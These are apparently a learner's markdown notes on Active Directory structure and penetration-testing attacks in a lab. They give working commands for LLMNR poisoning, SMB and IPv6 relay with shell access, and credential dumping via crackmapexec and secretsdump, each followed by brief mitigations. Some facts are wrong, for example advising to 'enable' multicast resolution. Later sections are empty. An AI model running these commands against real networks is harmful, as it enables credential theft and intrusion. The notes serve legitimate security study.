# Active Directory 

## Components

| Physical | Logical | 
|:-|:-|
|Data Store |Partitions | 
|Domain Controllers |Schema |
|Global catalog server  |Domains |
|Read-Only Domain Controller(RODC) |Domain Trees |
| |Forests | 
| |Sites | 
| |Organizational Units(OU) | 

### Physical Components
#### Physical - Domain Controller
- Example - Phonebook, change user password
- A domain controller is a server with the installed AD DS server role that has been promoted to a domain controller.
- Host a copy of the AD DS directory store
- Provide authentication and authorization services
- Replicate updates to other domain controllers in the domain and forest
- Allow administrative access to manage user accounts and network resources

#### Physical - AD DS Data Store
- Able to pull passwords in the directory.
- Contains database files and processes that store and manage directory information for users, services and applications
- Contains Ntds.dit file, location %SystemRoot%\NTDS folder on all domain controllers, accessible only through the domain controller processes and protocols.
  
### Logical Components

#### Logical  - AD DS Schema
| Object Types | Function | Examples |
|:-|:-|:-|
|Class Object |What objects can be created in the directory |User, Computer |
|Attribute Object |Information that can be attached to an object |Display Name|
- Defines every type of object that can be stored in the directory.
- Enforces rules regarding object creation and configuration

#### Logical  - Domain Controller
- Domains are used to group and manage objects in an organization(Ex:-something.com)
- An administrative boundary for applying policies to a group of objects.
- A replication boundary for replication data between domain controllers.
- An authentication and authorization boundary that provides a way to limit the scope of access to resources.

#### Logical  - Trees
- A domain tree is a hierarchy of domains in AD DS(Ex:-something.com->  in.something.com, -> us.something.com)
- Share a contiguous namespace with the parent domain, Can have additional child domains.
- By default create a 2-way transitive trust with other domains.

#### Logical  - Forest 
- Multiple sub-domains
- Share a common schema, configuration partition, and global catalog to enable searching
- Enable trust between all domains in the forest
- Share the EnterPrice Admins and Schema Admins groups

#### Logical  - Organizational Units (OUs)
- OUs are Active Directory containers that can contain users, groups, computers, and other OUs
- Represent your organization's hierarchically and logically
- Consistently manage a collection of objects, Delegate permissions to administer groups of objects, Apply policies

#### Logical  - Trusts
| Types of Trusts | Description | Diagram |
|:-|:-|:-|
|Directional | The trust direction flows from the trusting domain to the trusted domain | [Direction](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc759554.1b3d46af-d2cc-4d6f-87e9-59afa29f48a3(ws.10).gif)|
|Transitive | The trust relationship is extended beyond a two-domain trust to include other trusted domains |[Transitive](https://winintro.ru/domadmin.en/local/1f6970c2-62d3-482d-a78a-451d4333f511.gif)|
- Trusts provide a mechanism for users to gain access to resources in another domain.
- All domains in the forest trust all other domains in the forest, Trust can be extended outside the forest.

#### Logical  - Objects
|Object | Description|
|:-|:-|
|User|Enables network resource access for a user|
|InetOrgPerson|Similar to a user account, Used for compatibility with other directory services|
|Contacts|Used primarily to assign e-mail addresses to external users, Does not enable network access|
|Groups|Used to simplify the administration of access control|
|Computers|Enables authentication and auditing of computer access to resources|
|Printers|Used to simplify the process of locating and connecting to printers|
|Shared folders| enables users to search for shared folders based on properties |



## Lab Build
Install Lab from [GOADv3](https://github.com/Orange-Cyberdefense/GOAD/tree/v3-beta), Some reference to setup the [lab](https://orange-cyberdefense.github.io/GOAD/references/)
I tried this [Link](https://www.youtube.com/watch?v=fXausmYcObE)

## Initial Attack Vectors
Lets start the attacks

### Initial Attack - LLMNR Poisoning
- LLMNR(Link-Local Multicast Name Resolution) Poisoning is a common attack technique used in Active Directory environments, Previously known as NBT-NS. [Link](https://tcm-sec.com/wp-content/uploads/2023/09/llmnr-overview.png)
- LLMNR is a protocol that allows name resolution without the need for a DNS server, LLMNR poisoning exploits this protocol by responding to LLMNR queries with false information, potentially leading to credential theft.
- How it works
  * A user mistypes a hostname or tries to access a non-existent resource.
  * The system broadcasts an LLMNR query to resolve the name.
  * An attacker responds to this query, pretending to be the requested resource.
  * The victim's system attempts to authenticate with the attacker's machine.
  * The attacker captures the authentication attempt, including the user's NTLMv2 hashed credentials.

```powershell
# Tun0 is vpn address change accordingly
sudo responder -I tun0 -dwPv
#in order to capture the hash, open the file explorer in the search bar user <b>\\IP-address</b>, if you have only the cmd access <b> net view commands</b>
```
- Mitigations
  * Enable multicast resolution in GPO.
  * Require Network Access Control, which requires a complex password of more than 14 characters.


### Initial Attack - SMB Relay 
- SMB(Server Message Block) Relay is an attack where an attacker captures authentication attempts over the network and relays them to another machine, potentially gaining unauthorized access.
- How it works:
  * The attacker positions themselves between a client and a server.
  * When the client attempts to authenticate to a service, the attacker intercepts this attempt.
  * The attacker then relays these credentials to another target machine.
  * If successful, the attacker gains access to the target machine with the privileges of the intercepted user.
```powershell
# Check SMB is vulnerable or not
nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
# Message signing enabled but not required, Identified we can move forward with the attack

#Change the responder .conf file, SMB, HTTP make it off, CHeck with below commands on or off.
sudo responder -I tun0 -dwPv
# To capture the hash, open the file explorer in the search bar user <b>\\IP-address</b>, if you have only the cmd access <b> net view commands</b>
sudo ntlmrelayx.py –tf targets.txt –smb2support -c "whoami"
sudo ntlmrelayx.py –tf targets.txt –smb2support -i
# -i For  Interactive mode, you will get the port number and the localhost IP address, connect with Netcat shell
```
- Mitigations
  * Enable SMB Signing on all devices
  * Disable NTLM authentication on the network, 

### Initial Attack - IPv6 Attacks
- It's another form of relaying attack but sometimes SMB Relay password hash is not trackable, using IPv4, IPv6 is disbaled.
- Set up an IPV6 DNS resolution and get a request it will share to DC, Whenever the request comes it comes to us.(IPv6 -> DNS setup by us <-> DC)
- A
```powershell
sudo mitm6 -d ashok.local # RUn this first d for  Domain name
ntlmrelayx.py -6 -t ldaps://IP -wh path.ashok.local -l lootme # When ever the the event occurs and user logins, reboots we get the hash.
#lootme folder hash different files to investigate, check for the description and .html files easy access.
```
- Mitigations
  * Inbound Core Networking DHCP for IPv6
  * Inbound core networking ROuter Advertisement
  * Outbound Core networking DHCP for IPv6
  * If not using WPAD disable that
  * Enable LDAP signing and LDAP channel binding
  * Administrative users to protected group via delegation.

 ### Initial Attack - Password Attacks
 [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)
 - Sometimes the printers have IP set default, change IP to KALI IP address the run the responder to get the hash, netcat on port 389


## Post-Compromise Enumeration
- If you have a valid user account we can move forward.
- Tools we going to see Bloodhound, Plumhound, Ldapdomaindump, PingCastle, etc.

### Ldapdomaindump - Domain Enumeration 
- Trying to retrieve the information about the Active Directory similar to bloodhound.
```powershell
sudo ldapdomaindump ldaps://IP -u 'domain/username' -p 'password'
# It will generate .html, and .json extension files.
```
### Bloodhound - Domain Enumeration 
It will try to retrieve data that can give Visualize Active Directory information about Users, groups, and Domain Admins. We can perform trust attacks and relay attacks from Bloodhound.
```powershell
#Before that you need to start the neo4j for the Browser session
sudo neo4j start
sudo bloodhound
# Collect the data from the target. ns for nameserver will be Domain Controller.
sudo bloodhound-python -d domain.local -u username -p password -ns 192.168.138.136  -c all
# It will generate .json extension files and upload data into Bloodhound GUI to get the structure of Active Directory.
```

### Plumhound - Domain Enumeration 
- Link tp [g9thub](https://github.com/PlumHound/PlumHound)  
- Trying to retrieve the information about the Active Directory in browser view similar to Bloodhound.
```powershell
#Installation
git clone https://github.com/PlumHound/PlumHound
cd PlumHound
sudo pip3 install -r requirements.txt
# Start with tool
python3 PlumHound.py -ap "domain users@example.com" "domain admins@example.com"
# Before running this tool should run the neo4j and bloodhound running in the background.
python3 PlumHound.py --easy -p "Password of neo4j"
python3 PlumHound.py -x tasks/default.tasks -p "Password of neo4j"
# Open the index.html in Firefox for interactive view.
```

### Pingcastle - Domain Enumeration 
- Free to use some more functionality for paid service.
- Install the Pincastle.exe with elevated privileges to understand what privileges you have.

## Post-Compromise Attacks
- In this section once we have an account to get responder or relay attacks some sort of access, what can we do with the move attack elevate vertically or horizontally.

### Pass the Hash/Password Attacks - Post Compromise 
- If we crack a password and/or dump the SAM hashes, we can leverage both for lateral movement in networks.
- We can dump SAM, SYSTEM files using impacket-secrectsdump command.
- Wdigest is an old authentication protocol up to 2008, 2012 server, you trick the user logging get clear text password using wdigest.

```powershell
#Some commands for crackmapexec or netexec or nxc 
crackmapexec smb IP/24 -u user -d ashok.local -p password # Check for Pen3d! to login via wmiexec, psexec
crackmapexec smb IP/24 -u user -d ashok.local -H LM:NTLM --local-auth
crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth --shares
crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth --lsa
crackmapexec smb IP/24 -u user -d ashok.local -p password --local-auth -M lsassy # Dumpout real-time credentials.

# Lab time
impacket-secrectsdump ashok.local/USERNAME:'PASSWORD'@IP # It will dump a bunch LM:NTLM hashes, LSA secrets, 
impacket-secrectsdump USERNAME@IP -hashes LM:NTLM
#Process like llmnr(lateral-wdigest, domain control) -> user hash -> cracked -> sprayed the password -> found new login -> secret dump those logins -> local admin hashes -> respray the network with local accounts.
```
- Mitigations
  * Limit account re-use
  * Utilize strong passwords > 14
  * Privilege Access Management (PAM), tools cyber ark process of check-in or checkout period password will expire the attacks will limit.
 
### Kerberoasting Attacks - Post Compromise 
- An authenticated domain user requests a Kerberos ticket for an SPN. The retrieved Kerberos ticket is encrypted with the hash of the service account password affiliated with the SPN. (An SPN is an attribute that ties a service to a user account within the AD). The adversary then works offline to crack the password hash, often using brute force techniques.
- 




## After Compromising Domain -What we can do



## Additional Active Directory Attacks 


## Active Directory Case Studies

